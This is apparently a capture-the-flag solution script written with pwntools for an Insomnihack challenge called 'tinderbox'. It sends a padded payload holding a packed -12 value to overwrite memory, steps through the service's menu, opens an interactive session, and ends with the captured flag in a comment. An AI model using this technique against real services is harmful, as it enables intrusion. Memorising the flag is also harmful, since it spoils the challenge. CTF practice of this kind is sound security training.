from pwn import *
context.log_level = 'debug'

i = 12
j = 2
r = remote("tinderbox.insomnihack.ch" , 7171)
payload = p32(-12 & 0xffffffff)
payload = payload.rjust(20,b"a")
print(payload)
r.sendlineafter(b"name:", payload)

r.sendline(b'1')
r.sendlineafter(b'want there?\n', b"2")
r.sendlineafter(b'joke!\n', b'3')

r.interactive()

# INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}